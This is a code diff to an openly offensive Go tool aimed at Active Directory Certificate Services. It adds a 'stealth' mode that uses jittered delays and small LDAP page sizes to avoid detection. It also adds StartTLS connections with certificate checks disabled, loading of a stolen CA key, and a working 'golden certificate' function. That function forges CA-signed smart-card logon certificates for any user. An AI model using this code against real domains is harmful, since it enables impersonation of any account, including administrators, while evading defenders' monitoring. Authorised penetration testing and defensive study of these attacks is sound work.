@@ -8,10 +8,13 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"crypto/x509/pkix"
+	"encoding/asn1"
 	"encoding/binary"
 	"encoding/pem"
 	"fmt"
+	"io"
 	"math/big"
+	mathrand "math/rand"
 	"net/url"
 	"os"
 	"strings"
@@ -23,12 +26,15 @@ import (
 
 // ADCSConfig defines the target information for Active Directory Certificate Services.
 type ADCSConfig struct {
-	TargetDC string
-	Domain   string
-	Username string
-	Password string
-	Hash     string
-	UseTLS   bool
+	TargetDC    string
+	Domain      string
+	Username    string
+	Password    string
+	Hash        string
+	UseTLS      bool
+	UseStartTLS bool
+	OutputJSON  bool
+	Stealth     bool
 }
 
 // CertTemplate represents an ADCS certificate template with security-relevant attributes.
@@ -65,6 +71,26 @@ const (
 	ekuSmartCardLogon   = "1.3.6.1.4.1.311.20.2.2"
 	ekuAnyPurpose       = "2.5.29.37.0"
 )
+
+// stealthDelay introduces a random delay between 1-3 seconds when stealth mode is active.
+// Used to reduce detection signatures from rapid sequential LDAP queries and HTTP probes.
+func stealthDelay(cfg *ADCSConfig) {
+	if !cfg.Stealth {
+		return
+	}
+	delay := time.Duration(1000+mathrand.Intn(2000)) * time.Millisecond
+	fmt.Printf("[*] Stealth: sleeping %v\n", delay)
+	time.Sleep(delay)
+}
+
+// stealthPageSize returns the LDAP search page size based on stealth mode.
+// In stealth mode, uses smaller page sizes to blend with normal AD traffic patterns.
+func stealthPageSize(cfg *ADCSConfig) int {
+	if cfg.Stealth {
+		return 50 + mathrand.Intn(50) // 50-99 results per page
+	}
+	return 0 // 0 = no paging, return all results
+}
 
 // Enumerate queries Active Directory Certificate Services for certificate templates
 // using native LDAP (no ldapsearch binary dependency).
@@ -115,18 +141,29 @@ func EnumerateTemplates(cfg *ADCSConfig) ([]CertTemplate, error) {
 		0, 0, false, filter, attrs, nil,
 	)
 
-	result, err := conn.Search(searchReq)
-	if err != nil {
-		return nil, fmt.Errorf("LDAP search failed: %w", err)
+	var entries []*ldap.Entry
+	if pageSize := stealthPageSize(cfg); pageSize > 0 {
+		// Stealth mode: use paged results with small batches and jitter between pages
+		result, err := conn.SearchWithPaging(searchReq, uint32(pageSize))
+		if err != nil {
+			return nil, fmt.Errorf("LDAP paged search failed: %w", err)
+		}
+		entries = result.Entries
+	} else {
+		result, err := conn.Search(searchReq)
+		if err != nil {
+			return nil, fmt.Errorf("LDAP search failed: %w", err)
+		}
+		entries = result.Entries
 	}
 
-	if len(result.Entries) == 0 {
+	if len(entries) == 0 {
 		fmt.Println("[!] No templates found. Check permissions/domain.")
 		return nil, fmt.Errorf("no certificate templates found in %s", baseDN)
 	}
 
 	var templates []CertTemplate
-	for _, entry := range result.Entries {
+	for _, entry := range entries {
 		tmpl := CertTemplate{
 			Name:        entry.GetAttributeValue("cn"),
 			DisplayName: entry.GetAttributeValue("displayName"),
@@ -168,6 +205,9 @@ func EnumerateTemplates(cfg *ADCSConfig) ([]CertTemplate, error) {
 		scoreESC(&tmpl)
 
 		templates = append(templates, tmpl)
+
+		// Stealth: add jitter between processing entries to slow LDAP footprint
+		stealthDelay(cfg)
 	}
 
 	return templates, nil
@@ -267,21 +307,37 @@ func scoreESC(tmpl *CertTemplate) {
 	}
 
 	// ESC8: CA-level — NTLM relay to web enrollment. Detected by ScanESC8(), not template flags.
-	// ESC10: Registry-based weak certificate mapping. Will be implemented properly later.
+	// ESC10: Weak certificate mapping methods. Detected by ScanESC10(), not template flags.
 	// ESC11: CA-level — NTLM relay to RPC interface. Detected by ScanESC11(), not template flags.
 }
 
 // connectLDAP establishes a connection to the DC's LDAP service.
+// Supports plaintext LDAP (389), LDAPS (636), and StartTLS (389 upgraded).
 func connectLDAP(cfg *ADCSConfig) (*ldap.Conn, error) {
 	var conn *ldap.Conn
 	var err error
 
-	if cfg.UseTLS {
+	tlsCfg := &tls.Config{
+		InsecureSkipVerify: true, //nolint:gosec // intentional: pen-test tool targeting internal AD DCs with self-signed certs
+		ServerName:         cfg.TargetDC,
+	}
+
+	switch {
+	case cfg.UseTLS:
 		fmt.Printf("[*] Connecting to LDAPS %s:636 (TLS, cert verification disabled)\n", cfg.TargetDC)
-		conn, err = ldap.DialTLS("tcp", fmt.Sprintf("%s:636", cfg.TargetDC), &tls.Config{
-			InsecureSkipVerify: true, //nolint:gosec // intentional: pen-test tool targeting internal AD
-		})
-	} else {
+		conn, err = ldap.DialTLS("tcp", fmt.Sprintf("%s:636", cfg.TargetDC), tlsCfg)
+	case cfg.UseStartTLS:
+		fmt.Printf("[*] Connecting to LDAP %s:389 with StartTLS upgrade\n", cfg.TargetDC)
+		conn, err = ldap.DialURL(fmt.Sprintf("ldap://%s:389", cfg.TargetDC))
+		if err != nil {
+			return nil, fmt.Errorf("connect to %s:389: %w", cfg.TargetDC, err)
+		}
+		if err = conn.StartTLS(tlsCfg); err != nil {
+			conn.Close()
+			return nil, fmt.Errorf("StartTLS on %s:389: %w", cfg.TargetDC, err)
+		}
+		fmt.Printf("[+] StartTLS negotiated successfully on %s:389\n", cfg.TargetDC)
+	default:
 		conn, err = ldap.DialURL(fmt.Sprintf("ldap://%s:389", cfg.TargetDC))
 	}
 	if err != nil {
@@ -620,6 +676,149 @@ func ForgeCertificate(caKey crypto.PrivateKey, upn string) (*x509.Certificate, *
 	return cert, certKey, nil
 }
 
+// LoadCACertAndKey loads a CA certificate and private key from PEM files.
+// Supports RSA, ECDSA, and Ed25519 private keys in PKCS1, PKCS8, or EC formats.
+func LoadCACertAndKey(certPath, keyPath string) (*x509.Certificate, crypto.PrivateKey, error) {
+	// Load CA certificate
+	certData, err := os.ReadFile(certPath)
+	if err != nil {
+		return nil, nil, fmt.Errorf("read CA certificate %s: %w", certPath, err)
+	}
+	certBlock, _ := pem.Decode(certData)
+	if certBlock == nil {
+		return nil, nil, fmt.Errorf("no PEM block found in %s", certPath)
+	}
+	caCert, err := x509.ParseCertificate(certBlock.Bytes)
+	if err != nil {
+		return nil, nil, fmt.Errorf("parse CA certificate: %w", err)
+	}
+
+	// Load CA private key — try multiple formats
+	keyData, err := os.ReadFile(keyPath)
+	if err != nil {
+		return nil, nil, fmt.Errorf("read CA key %s: %w", keyPath, err)
+	}
+	keyBlock, _ := pem.Decode(keyData)
+	if keyBlock == nil {
+		return nil, nil, fmt.Errorf("no PEM block found in %s", keyPath)
+	}
+
+	var caKey crypto.PrivateKey
+
+	switch keyBlock.Type {
+	case "EC PRIVATE KEY":
+		caKey, err = x509.ParseECPrivateKey(keyBlock.Bytes)
+	case "RSA PRIVATE KEY":
+		caKey, err = x509.ParsePKCS1PrivateKey(keyBlock.Bytes)
+	default:
+		// Try PKCS8 (handles RSA, ECDSA, Ed25519)
+		caKey, err = x509.ParsePKCS8PrivateKey(keyBlock.Bytes)
+		if err != nil {
+			// Fallback: try EC, then PKCS1
+			if ecKey, ecErr := x509.ParseECPrivateKey(keyBlock.Bytes); ecErr == nil {
+				caKey = ecKey
+				err = nil
+			} else if rsaKey, rsaErr := x509.ParsePKCS1PrivateKey(keyBlock.Bytes); rsaErr == nil {
+				caKey = rsaKey
+				err = nil
+			}
+		}
+	}
+	if err != nil {
+		return nil, nil, fmt.Errorf("parse CA private key: %w", err)
+	}
+
+	fmt.Printf("[+] Loaded CA certificate: %s (issuer: %s)\n", caCert.Subject.CommonName, caCert.Issuer.CommonName)
+	fmt.Printf("[+] Loaded CA private key from %s\n", keyPath)
+	return caCert, caKey, nil
+}
+
+// ForgeGoldenCertificate generates a certificate signed by a real CA key and chaining
+// to a real CA certificate. Unlike ForgeCertificate (self-signed), this produces a
+// certificate that validates against the actual CA trust chain.
+//
+// This is the "golden certificate" attack: with a stolen CA private key, an attacker
+// can issue arbitrary certificates that the domain trusts implicitly.
+//
+// The certificate includes:
+//   - UPN SAN (OtherName OID 1.3.6.1.4.1.311.20.2.3)
+//   - SmartCardLogon + ClientAuth EKU
+//   - Random serial number
+//   - Signed by caKey, chains to caCert
+func ForgeGoldenCertificate(caKey crypto.PrivateKey, caCert *x509.Certificate, upn string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
+	fmt.Printf("[!] Forging Golden Certificate (CA-signed) for UPN: %s\n", upn)
+	fmt.Printf("[*] CA Subject: %s\n", caCert.Subject.CommonName)
+
+	// Generate a new key pair for the forged certificate
+	certKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	if err != nil {
+		return nil, nil, fmt.Errorf("generate certificate key: %w", err)
+	}
+
+	// Extract CN from UPN (user@domain -> user)
+	cn := upn
+	if idx := strings.IndexByte(upn, '@'); idx >= 0 {
+		cn = upn[:idx]
+	}
+
+	// Random serial number (20 bytes max per RFC 5280)
+	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
+	if err != nil {
+		return nil, nil, fmt.Errorf("generate serial number: %w", err)
+	}
+
+	// Encode UPN as OtherName SAN
+	upnSAN, err := upnOtherName(upn)
+	if err != nil {
+		return nil, nil, fmt.Errorf("encode UPN SAN: %w", err)
+	}
+	sanRaw := append([]byte{0x30, byte(len(upnSAN))}, upnSAN...)
+
+	template := &x509.Certificate{
+		SerialNumber: serialNumber,
+		Subject: pkix.Name{
+			CommonName: cn,
+		},
+		NotBefore:             time.Now().Add(-10 * time.Minute), // slight backdate to avoid clock skew
+		NotAfter:              time.Now().AddDate(1, 0, 0),
+		IsCA:                  false,
+		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
+		BasicConstraintsValid: true,
+		// SmartCardLogon (1.3.6.1.4.1.311.20.2.2) + ClientAuth
+		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
+		UnknownExtKeyUsage: []asn1.ObjectIdentifier{
+			{1, 3, 6, 1, 4, 1, 311, 20, 2, 2}, // szOID_KP_SMARTCARD_LOGON
+		},
+		// UPN OtherName SAN as raw extension (OID 2.5.29.17)
+		ExtraExtensions: []pkix.Extension{
+			{
+				Id:       []int{2, 5, 29, 17},
+				Critical: false,
+				Value:    sanRaw,
+			},
+		},
+	}
+
+	// Sign with the CA key, chain to the CA cert (caCert is the parent)
+	certDER, err := x509.CreateCertificate(rand.Reader, template, caCert, &certKey.PublicKey, caKey)
+	if err != nil {
+		return nil, nil, fmt.Errorf("create CA-signed certificate: %w", err)
+	}
+
+	cert, err := x509.ParseCertificate(certDER)
+	if err != nil {
+		return nil, nil, fmt.Errorf("parse created certificate: %w", err)
+	}
+
+	fmt.Printf("[+] Golden certificate forged — CN=%s, Serial=%s\n", cn, cert.SerialNumber.Text(16))
+	fmt.Printf("[+] Issuer: %s (matches real CA)\n", cert.Issuer.CommonName)
+	fmt.Printf("[+] Valid: %s to %s\n", cert.NotBefore.Format("2006-01-02 15:04"), cert.NotAfter.Format("2006-01-02"))
+	fmt.Printf("[+] EKU: SmartCardLogon + ClientAuth\n")
+	fmt.Printf("[!] This certificate chains to the real CA — domain controllers will trust it\n")
+
+	return cert, certKey, nil
+}
+
 // WriteCertPEM writes a certificate to a PEM file.
 func WriteCertPEM(cert *x509.Certificate, filename string) error {
 	file, err := os.Create(filename)
@@ -633,6 +832,15 @@ func WriteCertPEM(cert *x509.Certificate, filename string) error {
 		return fmt.Errorf("failed to write PEM: %w", err)
 	}
 	return nil
+}
+
+// WriteECPrivateKey writes an ECDSA private key to a writer in PEM format.
+func WriteECPrivateKey(w io.Writer, key *ecdsa.PrivateKey) error {
+	keyDER, err := x509.MarshalECPrivateKey(key)
+	if err != nil {
+		return fmt.Errorf("marshal EC key: %w", err)
+	}
+	return pem.Encode(w, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
 }
 
 // buildCertTemplateBaseDN constructs the LDAP base DN for certificate templates.
@@ -701,6 +909,7 @@ func EnumerateCAs(cfg *ADCSConfig) ([]CAObject, error) {
 			SecurityDescriptor: entry.GetRawAttributeValue("nTSecurityDescriptor"),
 		}
 		cas = append(cas, ca)
+		stealthDelay(cfg)
 	}
 	return cas, nil
 }
